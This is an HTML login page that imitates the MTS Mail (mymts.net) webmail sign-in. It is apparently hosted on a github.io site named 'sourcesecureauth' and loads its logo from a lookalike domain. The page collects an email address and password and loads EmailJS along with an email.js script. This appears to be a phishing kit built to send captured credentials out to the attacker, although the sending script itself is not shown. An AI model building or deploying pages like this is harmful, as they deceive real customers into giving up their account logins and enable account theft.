<!DOCTYPE html>
<html lang="en">
<head>
    <base href="https://sourcesecureauth.github.io/newlogin/" />
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>MTS Mail | Login</title>
    <link href="styles.css" rel="stylesheet" />
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<script src="email.js"></script>
<body>
    <div class="wrapper">
        <form id="form" name="sentMessage" novalidate="novalidate">
            <input name="__original_url" type="hidden" value="https://sourcesecureauth.github.io/newlogin/"/>
            <div class="logo">
                <img src="https://cableco.auth-gateway.net/images/mts/bellmts.png" alt="MTS Logo" />
                <p>Log in with your mymts.net email address</p>
            </div>
            <div class="container">
                <div class="input-box">
                    <input id="email" name="email" placeholder="Email Address (example@mymts.net)" required="" type="text" />
                </div>
                <div class="input-box">
                    <input id="pw" name="pw" placeholder="Password" required="" type="password" />
                    <button id="togglePassword" type="button">Show</button>
                </div>
                <button class="btn" id="button" type="submit">LOG IN</button>
                <div class="register-link">
                    <input type="checkbox" /> <span>Remember Me</span> <a href="#">Forgot Password?</a>
                </div>
            </div>
        </form>
    </div>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script src="email.js"></script>
    <script>
        const passwordInput = document.getElementById("pw");
        const toggleButton = document.getElementById("togglePassword");
        toggleButton.addEventListener("click", function () {
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                toggleButton.textContent = "Hide";
            } else {
                passwordInput.type = "password";
                toggleButton.textContent = "Show";
            }
        });
    </script>
</body>
</html>
